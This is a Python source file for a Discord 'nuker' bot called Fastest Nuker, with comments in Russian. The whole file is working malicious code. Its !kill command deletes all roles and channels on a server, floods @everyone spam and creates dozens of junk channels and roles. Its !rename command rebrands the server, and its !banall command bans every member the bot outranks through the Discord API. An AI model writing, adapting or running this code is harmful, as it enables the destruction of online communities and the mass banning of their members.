# Импортируем библиотеки
from discord import Intents
from discord.ext import commands
from requests import put
import discord
from asyncio import create_task

prefix = '!' # префикс нашего бота
token = 'Bot token' # токен бота
spamtext = '@everyone @here\nВас крашнул бот Fastest Nuker!\nИсходный код доступен на GitHub: https://github.com/forzel-new/fastestnuker\nDiscord сервер создателя: https://discord.gg/fzlgroup' # текст спама при краше

intents = Intents.default()
intents.members = True
client = commands.Bot(command_prefix=prefix, help_command=None, intents=intents)
# Включаем интенты

async def killobject(obj):
    try: await obj.delete()
    except: pass

async def sendch(ch,text,count):
 for _ in range(count):
    try: await ch.send(text)
    except: pass

async def createchannel(ctx):
    try: c = await ctx.guild.create_text_channel('crash-by-fastestnuker')
    except: pass
    else: create_task(sendch(ch=c,text=spamtext,count=5))

async def createrole(ctx):
    try: await ctx.guild.create_role(name='Crashed By Fastest Nuker')
    except: pass

@client.command()
async def kill(ctx):
    await ctx.message.delete()
    await ctx.author.send(f'Краш сервера `{ctx.guild}` (id: {ctx.guild.id}) запущен!')
    for rl in ctx.guild.roles:
        create_task(killobject(obj=rl))
    for channel in ctx.guild.text_channels:
        create_task(sendch(ch=channel,text=spamtext,count=1))
    for channel in ctx.guild.channels:
        create_task(killobject(obj=channel))
    for _ in range(50):
        create_task(createchannel(ctx))
        create_task(createrole(ctx))
    await ctx.author.send(f'Краш сервера `{ctx.guild}` (id: {ctx.guild.id}) завершен!')

@client.command()
async def rename(ctx):
    await ctx.message.delete()
    with open('icon.PNG', 'rb') as f:
        icon = f.read()
        await ctx.guild.edit(name='Crashed by Fastest Nuker', icon=icon)
    await ctx.author.send(f'Сервер (id) {ctx.guild.id} был переименован, а так-же изменена ему иконка')

async def banus(ctx, limit=None):
    fetched = ctx.guild.fetch_members(limit=limit)
    memlist = await fetched.flatten()
    for member in memlist:
        if member.roles[-1].position >= ctx.guild.me.roles[-1].position:
            continue
        guild = ctx.guild
        put(f'https://discord.com/api/guilds/{guild.id}/bans/{member.id}', headers={'Authorization': 'Bot ' + token, 'X-Audit-Log-Reason': 'Crashed by FastestNuker'}, json={'delete_message_days': 1})

@client.command()
async def banall(ctx):
    create_task(banus(ctx,limit=None))
    await ctx.author.send(f'Все участники на сервере (id) {ctx.guild.id} в ближайшем времени будут забанены (если у меня есть права на это)')

@client.command()
async def help(ctx):
    await ctx.message.delete()
    try:
        await ctx.author.send(embed=discord.Embed(title='FastestNuker',description=f'`!kill` - авто краш сервера\n`!rename` - сменить иконку и имя серверу\n`!banall` - бан всех участников сервера',colour=discord.Colour.from_rgb(228,66,0)))
    except:
        await ctx.send(embed=discord.Embed(title='Открой личку чтобы чекнуть хелп'))

client.run(token)
